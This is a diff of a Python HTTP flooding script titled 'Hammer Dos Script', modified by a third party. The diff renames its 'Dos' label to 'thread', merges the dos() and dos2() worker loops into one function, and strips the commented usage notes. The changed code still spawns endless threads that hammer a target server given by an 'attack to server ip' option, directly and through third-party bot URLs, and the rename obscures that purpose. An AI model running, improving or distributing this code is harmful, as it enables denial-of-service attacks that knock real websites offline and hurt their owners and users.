@@ -1,12 +1,11 @@
 #!/usr/bin/python3
 # -*- coding: utf-8 -*-
 
-# python 3.3.2+ Hammer Dos Script v.1
+# python 3.3.2+ Hammer thread Script v.1
 # by Can Yalçın
 # only for legal purpose
 
 # Modded by NeXX. 
-
 
 from queue import Queue
 from optparse import OptionParser
@@ -62,32 +61,15 @@ def down_it(item):
 		#print("\033[91m",e,"\033[0m")
 		time.sleep(.1)
 
-
-def dos():
+def thread(th):
 	while True:
-		item = q.get()
-		down_it(item)
-		q.task_done()
+		item = th.get()
 
-
-def dos2():
-	while True:
-		item=w.get()
-		bot_hammering(random.choice(bots)+"http://"+host)
-		w.task_done()
-
-
-# def usage():
-# 	print (''' \033[92m	Hammer Dos Script v.1 http://www.canyalcin.com/
-# 	It is the end user's responsibility to obey all applicable laws.
-# 	It is just for server testing script. Your ip is visible. \n
-# 	usage : python3 hammer.py [-s] [-p] [-t]
-# 	-h : help
-# 	-s : server ip
-# 	-p : port default 80
-# 	-t : turbo default 135 \033[0m''')
-# 	sys.exit()
-
+		if th == q:
+			down_it(item)
+		elif th == w:
+			bot_hammering(random.choice(bots)+"http://"+host)
+		th.task_done()
 
 def get_thr():
 	global thr
@@ -103,25 +85,14 @@ def get_parameters():
 	optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
 	optp.add_option("-s","--server", dest="host",help="attack to server ip -s ip")
 	optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
-	# optp.add_option("-t","--turbo",type="int",dest="turbo",help="default 135 -t 135")
-	# optp.add_option("-h","--help",dest="help",action='store_true',help="help you")
 	opts, args = optp.parse_args()
 	logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
-	# if opts.help:
-	# 	usage()
 	if opts.host is not None:
 		host = opts.host
-	# else:
-	# 	usage()
 	if opts.port is None:
 		port = 80
 	else:
 		port = opts.port
-	# if opts.turbo is None:
-	# 	thr = 135
-	# else:
-	# 	thr = opts.turbo
-
 
 # reading headers
 global data
@@ -164,10 +135,10 @@ def main(_host='', _port=0):
 	
 	while True:
 		for i in range(int(thr)):
-			t = threading.Thread(target=dos)
+			t = threading.Thread(target=thread, args=(q,))
 			t.daemon = True  # if thread is exist, it dies
 			t.start()
-			t2 = threading.Thread(target=dos2)
+			t2 = threading.Thread(target=thread, args=(w,))
 			t2.daemon = True  # if thread is exist, it dies
 			t2.start()
 	
